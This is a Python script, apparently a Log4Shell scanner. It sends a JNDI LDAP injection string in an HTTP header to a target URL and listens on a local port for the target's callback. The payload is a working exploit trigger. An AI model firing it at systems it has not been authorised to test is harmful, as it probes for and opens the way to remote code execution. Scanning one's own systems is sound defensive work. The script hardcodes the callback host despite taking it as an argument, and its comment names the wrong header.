import logging
import requests
import socket
import argparse
import threading
import time
import os

os.environ['NO_PROXY'] = '127.0.0.1'

handler = logging.StreamHandler()
handler.setFormatter(
    logging.Formatter(
        style="{",
        fmt="[{name}:{filename}] {levelname} - {message}"
    )
)

log = logging.getLogger("log4jscanner")
log.setLevel(logging.DEBUG)
log.addHandler(handler)

def tcp_server(attacker_host):
    _, PORT = attacker_host.split(':')
    HOST = ''
    PORT = int(PORT)

    log.debug(f"Starting server on 0.0.0.0:{PORT}")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        conn, addr = s.accept()
        with conn:
            log.debug(f"Connected by {addr}. If this is the same host you attacked its most likely vulnerable")
            while True:
                data = conn.recv(1024)
                if not data: break
                print(data.hex())
                break

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('url', help='target http url')
    parser.add_argument('--attacker-host', type=str, dest='attacker_host', default='127.0.0.1:1389', help="attacker's host:port ")
    parser.add_argument('--timeout', type=int, dest='timeout', default=10, help='timeout to start listening')

    args = parser.parse_args()

    server_thread = threading.Thread(target=tcp_server, args=(args.attacker_host,), daemon=True)
    server_thread.start()

    time.sleep(5)

    try:
        """
        Due of the nature of the exploit, any HTTP field could be used to exploit a vulnerable machine (as long as it's being logged on the affected host)
        Here we're just injecting the string in the User-Agent field.
        """

        requests.get(
            args.url,
            headers={'X-Api-Version': '${jndi:ldap://host.docker.internal:1389/a}'},
            verify=False
        )
    except requests.exceptions.ConnectionError as e:
        log.error(f"HTTP connection to target URL error: {e}")

    log.debug(f"Waiting {args.timeout} seconds for a response")
    time.sleep(args.timeout)

if __name__ == "__main__":
    main()